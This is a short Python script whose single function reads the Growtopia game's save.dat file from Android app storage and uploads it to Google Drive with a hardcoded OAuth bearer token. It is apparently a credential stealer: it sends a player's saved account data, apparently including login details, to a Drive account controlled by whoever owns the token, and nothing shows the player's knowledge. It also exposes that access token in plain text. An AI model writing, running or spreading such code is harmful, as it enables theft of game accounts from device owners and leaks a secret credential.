import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMDD3_euiR4wPs2WyBOQnTVJNi_Oee99jW14KF92BTOnMUI02Jlz_N8m_WB3fBv30Dz6jiDS2Pt4B8jgEWTWZgc8eZ6SQrld60uaFyFFkYo9isd1fRPrYuDQjHIzA4yQBgH_8GXWqJWpTRM1iU3I_FSX"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


